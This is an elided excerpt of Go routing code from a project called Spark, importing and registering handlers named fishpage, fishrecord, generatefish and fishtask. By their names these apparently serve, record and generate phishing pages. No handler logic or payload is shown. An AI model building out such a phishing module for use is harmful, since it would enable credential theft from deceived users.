...
import (
	...
	"Spark/server/handler/fishpage"
	"Spark/server/handler/fishrecord"
	"Spark/server/handler/fishstop"
	"Spark/server/handler/fishtask"
	"Spark/server/handler/generate"
	"Spark/server/handler/generatefish"
...
func InitRouter(ctx *gin.RouterGroup) {
	...
	ctx.Any(`/:fishapi`, fishpage.Fishpage)
	group := ctx.Group(`/`, AuthHandler)
	{
		...
		group.Any(`/fish/create`, generatefish.GenerateProject)
		group.Any(`/fish/record`, fishrecord.Fishrecord)
		group.Any(`/fish/task`, fishtask.Fishtask)
		group.Any(`/fish/stop`, fishstop.Fishstop)
	}
}
